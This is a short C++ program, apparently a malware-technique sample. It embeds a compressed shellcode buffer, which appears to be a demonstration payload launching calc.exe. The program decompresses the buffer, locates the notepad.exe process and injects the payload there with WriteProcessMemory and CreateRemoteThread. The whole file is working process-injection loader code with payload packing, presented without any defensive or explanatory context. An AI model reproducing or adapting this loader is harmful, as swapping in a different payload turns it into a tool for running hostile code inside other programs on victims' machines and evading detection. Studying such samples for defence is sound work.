#include "Win32Helper.h"


INT main(VOID)
{
	//payload buffer
	BYTE CompressedBuffer[] = "\x18\xb1\x0\xfc\x48\x83\xe4\xf0\xe8\xc0\x0\x0\x0\x0\x41\x51\x41\x50\x52\x51\x0\x56\x48\x31\xd2\x65\x48\x8b\x52\xa\x60\x0\x18\x18\x0\x18\x20\x48\x8b\x72\x0\x50\x48\xf\xb7\x4a\x4a\x4d\x31\x0\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x0\x2\x2c\x20\x41\xc1\xc9\xd\x41\x80\x1\xc1\xe2\xed\x52\x41\x51\x1\x4a\x0\x8b\x42\x3c\x48\x1\xd0\x8b\x80\x82\x88\x0\x90\x48\x85\xc0\x74\x67\x0\x1a\x0\x50\x8b\x48\x18\x44\x8b\x40\x20\x0\x49\x1\xd0\xe3\x56\x48\xff\xc9\x80\x41\x8b\x34\x88\x48\x1\xd6\x4\x8e\x1\x4\x82\x38\xe0\x75\xf1\x4c\x3\x4c\x0\x24\x8\x45\x39\xd1\x75\xd8\x58\x5\x0\x2f\x24\x0\x2f\x66\x41\x8b\xc\x48\x45\x0\xb\x1c\x0\xb\x41\x8b\x4\x0\x36\xd0\x80\x41\x58\x41\x58\x5e\x59\x5a\x0\x6\x0\x59\x41\x5a\x48\x83\xec\x20\x41\x0\x52\xff\xe0\x58\x41\x59\x5a\x48\x0\x8b\x12\xe9\x57\xff\xff\xff\x5d\x18\x48\xba\x1\x0\x7d\x1\x2\x48\x8d\x8d\x2\x1\x0\xb\x41\xba\x31\x8b\x6f\x87\x0\xff\xd5\xbb\xe0\x1d\x2a\xa\x41\x0\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x0\x83\xc4\x28\x3c\x6\x7c\xa\x80\x0\xfb\xe0\x75\x5\xbb\x47\x13\x72\x0\x6f\x6a\x0\x59\x41\x89\xda\xff\x0\xd5\x63\x61\x6c\x63\x2e\x65\x78\x0\x65\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0\x0";
	//size of payload buffer
	DWORD Size = sizeof(CompressedBuffer);

	HMODULE hMod = NULL;
	ULONG Out = sizeof(CompressedBuffer);
	DWORD oldProtect = NULL;

	PBYTE DecompressedBuffer = CompressedBuffer;

	//Allocate new payload
	DecompressedBuffer = (PBYTE)VirtualAlloc(NULL, Out, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//Decompress payload
	Out = LzStandardDecompressBuffer((PBYTE)CompressedBuffer, Size, (PBYTE)DecompressedBuffer, Out);


	//Find target
	CHAR targetName[] = "notepad.exe\0";
	auto targetPID = GetPidFromEnumProcessesA(targetName);

	//Execute payload in target
	MpfPiWriteProcessMemoryCreateRemoteThread((PBYTE)DecompressedBuffer, Size, targetPID);


	if (DecompressedBuffer)
		HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, DecompressedBuffer);

	return ERROR_SUCCESS;
}
